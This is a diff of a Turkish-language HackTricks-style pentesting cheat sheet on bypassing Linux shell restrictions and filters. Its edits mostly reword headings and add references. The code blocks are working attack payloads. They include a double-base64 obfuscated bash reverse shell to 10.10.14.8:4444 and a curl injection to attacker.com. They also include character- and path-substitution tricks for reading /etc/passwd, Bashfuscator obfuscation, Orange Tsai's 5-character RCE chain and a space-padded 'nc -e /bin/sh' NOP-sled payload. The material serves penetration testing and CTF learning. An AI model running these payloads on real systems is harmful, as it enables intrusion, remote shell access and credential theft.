@@ -1,12 +1,12 @@
 # Linux Kısıtlamalarını Aşma
 
-{{#include ../../../banners/hacktricks-training.md}}
+## Yaygın Kısıtlamaları Aşma Yöntemleri
 
-## Yaygın Kısıtlama Aşma Yöntemleri
+PayloadsAllTheThings, Bo0oM's cheat sheet ve bağlantısı verilen iki Secjuice makalesindeki command-injection ve WAF-evasion koleksiyonları, bu bölümdeki shell-syntax varyasyonları hakkında temel bilgiler sağlar.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
-# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
+# Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Path'leri ve yasaklı kelimeleri bypass etme
+### Bypass Yolları ve yasaklı kelimeler
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -105,12 +105,12 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Backslash ve slash bypass'ı
+### Bypass backslash ve slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Pipe'ları Bypass Etme
+### Pipe kısıtlamalarını aşma
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -133,19 +133,19 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Ortam Değişkenlerinden Karakter Alma
+### Ortam Değişkenlerinden Karakterleri Alma
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### DNS veri sızdırma
 
-Örneğin **burpcollab** veya [**pingb**](http://pingb.in) kullanabilirsiniz.
+Out-of-band callback'ler için Burp Collaborator gibi collaborator tarzı bir servis, hedef uygulamanın harici bir sunucuyla etkileşime girmesini sağlayabilir; mevcut [**pingb**](http://pingb.in) bağlantısı güncel bir kullanılabilirlik iddiası olarak değil, geçmişten kalan bir yönlendirme olarak korunmuştur.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-Harici fonksiyonları çalıştıramadığınız ve yalnızca **RCE elde etmek için sınırlı sayıda builtin'e erişiminiz** olduğu durumlarda bunu yapmak için kullanabileceğiniz bazı pratik yöntemler vardır. Genellikle **tüm** **builtin'leri** kullanamayacağınız için jail'i aşmayı denemek üzere **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
-Öncelikle tüm [**shell builtin'lerini**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** Ardından burada bazı **öneriler** bulabilirsiniz:
+Kısıtlanmış bir shell'de kullanılabilen builtins, bu örnekler için geriye kalan komut yüzeyidir; Bash, builtin komutlarını ve yürütme grammar'ını belgeler.<sup>[[7]](#references)</sup> Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
+Mevcut [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) yönlendirmesiyle başlayın, ardından aşağıdaki Bash'e özgü teknikleri deneyin:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -208,14 +208,18 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
+
+Aşağıdaki çağrı, açık kaynaklı bir Bash obfuscation framework'ü olan Bashfuscator'ı kullanır; code comment içindeki repository linki navigation amacıyla korunmuştur.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### 5 karakterle RCE
+
+Aşağıdaki iki tarihî 5 karakterli örnek, challenge reproductions olarak korunmuştur: ana challenge repository’sine [Orange Tsai’nin repository’sinden](https://github.com/orangetw/My-CTF-Web-Challenges) ulaşılabilir; kod bloğundaki ikinci write-up bağlantısı ise mevcut erişilebilirliği doğrulanmamış bir navigation bağlantısıdır.<sup>[[9]](#references)</sup>
 ```bash
-# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
-#Oragnge Tsai solution
+# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
+#Orange Tsai solution
 ## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
 http://host/?cmd=>ls\
 http://host/?cmd=ls>_
@@ -296,13 +300,13 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-**read-only ve noexec korumalarına** sahip bir filesystem'in içinde veya distroless bir container'da olsanız bile, **bir shell dahil olmak üzere arbitrary binary'leri execute etmenin** hâlâ yolları vardır!:
+**read-only ve noexec korumalarına** sahip bir dosya sistemi içindeyseniz veya bir **distroless image** kullanıyorsanız, ortam Linux `mount(8)` ve Distroless projesi tarafından belgelenen yürütme kısıtlamaları uygular; bağlantı verilen sayfa, bu kısıtlar dahilinde çalışmaya yönelik teknikleri derler.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Chroot & diğer Jail Bypass teknikleri
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -310,30 +314,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Bir vulnerability, sonunda `system()` veya başka bir shell'e ulaşan bir argument'i kısmen kontrol etmenize izin verdiğinde, execution'ın payload'unuzu okumaya başladığı exact offset'i bilmiyor olabilirsiniz. Geleneksel NOP sled'ler (ör. `\x90`) shell syntax'ında **çalışmaz**, ancak Bash bir command'i execute etmeden önce baştaki whitespace karakterlerini zararsız biçimde yok sayar.
+Bir güvenlik açığı, sonunda `system()` veya başka bir shell'e ulaşan bir argümanı kısmen kontrol etmenize izin verdiğinde payload offset'i belirsiz olabilir. Alan Cao ve Will Tan, bir shell payload'ının memory-mapped NVRAM'e yayıldığı ve başına boşluklar eklendiği, kısıtlı bir embedded-device senaryosunu açıklamaktadır.<sup>[[5]](#references)</sup>
 
-Bu nedenle gerçek command'inizin başına uzun bir spaces veya tab karakterleri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz:<sup>[[5]](#references)</sup>
+Bu nedenle gerçek komutunuzun başına uzun bir boşluk veya tab karakteri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz; Bash, basit bir komutta kelimeleri ayıran boş karakterler olarak boşlukları ve tab karakterlerini tanımlar.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Bir ROP chain (veya herhangi bir memory-corruption primitive), instruction pointer'ı space block içindeki herhangi bir noktaya getirirse Bash parser, `nc` komutuna ulaşana kadar boşlukları basitçe atlar ve komutunuzu güvenilir bir şekilde çalıştırır.
+Bir ROP chain (veya başka bir memory-corruption primitive), space block içinde herhangi bir noktadan başlayan bir command-string pointer geçirirse Bash, command'e ulaşana kadar baştaki kalan boşlukları ayrıştırabilir; atıfta bulunulan router exploit'inde bu, belirsiz string offset'lerinin kullanılabilmesini sağladı.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Pratik kullanım alanları:
+Kısıtlı embedded hedeflerdeki pratik kullanım alanları şunlardır:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blob'ları** (ör. NVRAM) (process'ler arasında erişilebilir olanlar).
-2. Saldırganın payload'ı hizalamak için NULL byte'lar yazamadığı durumlar.
-3. Yalnızca BusyBox `ash`/`sh` kullanılabilen embedded cihazlar – bunlar da baştaki boşlukları yok sayar.
+1. **Memory-mapped configuration blob'ları** (ör. NVRAM); bunlara process'ler arasında erişilebilir.<sup>[[5]](#references)</sup>
+2. Payload'u hizalamak için attacker'ın NULL byte'lar yazamadığı payload kanalları (alignment problem'inin genel bir uyarlaması).<sup>[[5]](#references)</sup>
+3. Kaynakları kısıtlı sistemlerde BusyBox'ın applet'ler olarak belgelediği, küçük bir BusyBox `ash`/`sh` environment'ına sahip embedded cihazlar.<sup>[[10]](#references)</sup>
 
-> 🛠️  Bu trick'i `system()` çağıran ROP gadget'larıyla birleştirerek memory-constrained IoT router'larda exploit güvenilirliğini önemli ölçüde artırın.
+> 🛠️ Bu tekniği kontrollü bir lab ortamında `system()` çağıran ROP gadget'larıyla birleştirin; atıfta bulunulan router araştırması, bu birleşimi kısıtlı donanım üzerinde göstermektedir.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-
+- [3] [Web Application Firewall (WAF) Kaçınma Teknikleri #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Kaçınma Teknikleri #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao ve Will Tan — Terk edilmiş donanımlardaki zero day'leri exploit etme – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
+- [7] [bash(1) — Linux manual sayfası](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
+- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
+- [11] [mount(8) — Linux manual sayfası](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
